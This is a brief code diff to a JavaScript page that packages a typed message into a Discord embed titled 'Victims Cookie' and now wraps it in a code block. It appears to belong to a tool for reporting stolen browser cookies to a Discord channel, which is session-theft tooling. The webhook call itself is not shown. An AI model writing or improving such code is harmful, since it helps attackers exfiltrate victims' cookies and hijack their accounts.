@@ -61,7 +61,7 @@
       const messageInput = document.getElementById("messageInput");
       const sendButton = document.getElementById("sendButton");
       const errorMessage = document.getElementById("errorMessage");
-      const message = messageInput.value;
+      let message = messageInput.value;
 
       errorMessage.textContent = ""; // Clear any previous error messages
 
@@ -71,12 +71,15 @@
         return;
       }
 
+      // Add triple backticks around the message for Discord code block format
+      message = `\`\`\`${message}\`\`\``;
+
       // Create the embed payload
       const embedPayload = {
         embeds: [
           {
             title: "Victims Cookie", // Embed title
-            description: message, // Embed description
+            description: message, // Embed description with backticks
             color: 16711680, // Embed color (red in this case)
             timestamp: new Date().toISOString() // Adds a timestamp
           }
